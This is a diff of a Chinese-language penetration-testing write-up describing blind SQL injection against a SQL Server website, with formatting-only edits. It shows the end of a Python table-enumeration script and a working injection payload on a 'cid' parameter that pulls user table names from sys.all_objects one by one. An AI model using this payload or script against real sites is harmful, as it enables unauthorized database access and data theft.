@@ -52,7 +52,8 @@ def get_sqlserver_table(table_list, table_num):
         print("[{}] - TableName: {}".format(str(r.status_code), table_name))
 if __name__ == "__main__":
     get_sqlserver_table(table_list, 16)
- ```
+
+```
 
 当取得第16个的时候，还是没有出现用户表、管理员表等，而且网站抛出了错误，无法继续取，突然没有其他办法了。
 
@@ -65,11 +66,7 @@ if __name__ == "__main__":
 cid =1 and (select top 1 name from [数据库名称].sys.all_objects where type='U' AND is_ms_shipped=0 and name not in (''))>0 AND 'aNmV'='aNmV
 ```
 
-这是第一次请求的Payload，集合这里我写个空，不管怎样，集合都可以取得第一个表名。
-
-第二个、第三个表名都会向集合增加，以此类推，通过SQLMAP判断，有146个表。
-
-
+这是第一次请求的Payload，集合这里我写个空，不管怎样，集合都可以取得第一个表名。第二个、第三个表名都会向集合增加，以此类推，通过SQLMAP判断，有146个表。
 
 到第16个因为原始语句有干扰，不能继续取得后续的表名，但我不想放弃。
 
